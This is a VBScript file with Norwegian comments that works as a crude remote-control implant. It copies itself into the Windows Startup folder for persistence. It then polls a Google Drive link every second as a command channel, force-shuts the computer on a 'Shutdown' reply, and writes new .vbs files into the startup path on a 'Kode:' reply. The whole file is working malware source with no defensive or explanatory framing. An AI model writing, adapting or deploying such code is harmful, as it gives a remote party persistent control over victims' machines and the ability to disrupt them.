Dim filesys, scriptPath, scriptName, destinationPath, sourceFile, destFile

' Create a FileSystemObject
Set filesys = CreateObject("Scripting.FileSystemObject")

' Get the full path of the currently running script
scriptPath = filesys.GetAbsolutePathName(WScript.ScriptFullName)

' Get the name of the script file
scriptName = filesys.GetFileName(scriptPath)

' Specify the destination folder
Set wshShell = CreateObject( "WScript.Shell" )
strUserName = wshShell.ExpandEnvironmentStrings( "%USERNAME%" )
destinationPath = "C:\Users\" + strUserName + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

' Build the full paths for source and destination files
sourceFile = scriptPath
destFile = filesys.BuildPath(destinationPath, scriptName)

' Check if the source file exists
If filesys.FileExists(sourceFile) Then
    ' Copy the file
    filesys.CopyFile sourceFile, destFile, True
End If


Set objExplorer = CreateObject("InternetExplorer.Application")

kode = "Msgbox(""Hei"")"
navn = "test.vbs"


url = "https://drive.google.com/uc?export=download&id=1YJRR4lbQfYyJkc-c89n3xCEVTsnoOmRO"
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
Set objShell = WScript.CreateObject("WScript.Shell")


do

' Error handling
On Error Resume Next

' Open link
objHTTP.Open "GET", url, False

' Send request
objHTTP.send

If Err.Number = 0 Then
	If objHTTP.responseText = "Shutdown" Then
		objShell.Run "shutdown.exe -s -f -t 0", 0, false
	ElseIf InStr(objHTTP.responseText, "Melding:") > 0 Then
		a=Split(objHTTP.responseText,":")
		Msgbox a(1)
	ElseIf InStr(objHTTP.responseText, "Kode:") > 0 Then
		Msgbox("1")
		a=Split(objHTTP.responseText,":")
		Msgbox("2")
		CreateFileAndWriteContent destinationPath + navn, kode
		Msgbox("3")
	End If
Else
    ' Error
End If

' Reset error handling
'On Error GoTo 0

WScript.Sleep 1000

loop

Sub CreateFileAndWriteContent(filePath, fileContent)
    ' Opprett en fil og skriv innholdet til den
    Dim objFSO, objFile
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(filePath, True)
    
    ' Skriv innholdet til filen
    objFile.Write fileContent
    
    ' Lukk filen
    objFile.Close
End Sub
